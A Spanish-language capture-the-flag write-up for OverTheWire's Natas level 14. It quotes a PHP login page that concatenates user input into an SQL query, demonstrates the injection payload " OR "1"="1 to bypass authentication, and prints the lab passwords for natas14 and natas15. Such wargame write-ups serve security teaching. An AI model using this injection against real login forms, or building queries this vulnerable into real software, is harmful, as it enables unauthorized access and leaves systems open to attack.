#Natas Level 13 → Level 14

Username: natas14

URL:      http://natas14.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas14.natas.labs.overthewire.org** 
- **Usuario    : natas14**
- **Contraseña : Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1**

La contraseña la hemos sacado del nivel anterior.

Accedemos a la página y nos muestra unos cmapos en el que tenemos que meter un **usuario** y **contraseña**

En principio parece un reto de **SQL Injection**

Vamos a ver el código fuente de la página:

```php
<body> 
<h1>natas14</h1> 
<div id="content"> 
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body>
```

Analizando el código podemos observar como:

- Se realiza una conexión a una base de datos **Mysql** 
- Con el usuario : **natas14**
- Selecciona la base de datos **natas14**
- Para consultar el **Usuario** y **Contraseña** que hemos introducido con el valor de la **Base de Datos** o **BBDD**

Probamos si los campos de **usuario** y **contraseña** son **injectables** a código **SQL**

Solamente viendo el código, sabemos que utiliza **concatenación** de strings que ya nos indica un posible fallo de seguridad:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
```
Probamos si los parámentros son injectable y ver si nos da algún error

```html
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
```

En el ejemplo anterior he puesto ** natas14" **, el **usuario** + ** " ** (comilla doble) como argumento en el campo **username** y nos ha salido error.

Con esto ya sabemos que es injectable a código **SQL** así que ahora nos toca trastear con la **$query** de arriba para que nos devuelva la contraseña

Vamos a analizar la **$query**

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
```

Sabemos que el usuario tiene que ser **natas15** pero no sabemos cual es la contraseña de ese usuario.

Tenemos que conseguir que este campo sea **True** para hacer un **bypass** y así obtener la contraseña:

```sql
and password=\"".$_REQUEST["password"]."\"";    <- Tiene que ser = True
```

Como ya sabemos algo de **SQL** (y sino lo aprendemos :smile:) tenemos que pasarle al campo **$_REQUEST["password"]** el valor:

```sql
" OR "1"="1
```

Para que la consulta completa quede de la siguiente manera:

```sql
and password="" OR "1"="1";
```

La consulta anterior mirará si algunos de los dos valores nos devuelve un **True**. 

En este caso **1=1** nos devuelve **True** por lo que ignora **password=''** y hace la consulta completa con el usuario **natas15**

```sql
$query = "SELECT * from users where username="natas15" and  password="" OR "1"="1"; "; 
```

Vamos al formulario de la página anterior y ponemos eso valores:

```html
Usuario: natas15
Password: " OR "1"="1 
```

Pulsamos el botón de enviar y nos muestra un mensaje de **Successful login!** :smile: :beers:

```html
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

**FLAG** = {AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J}












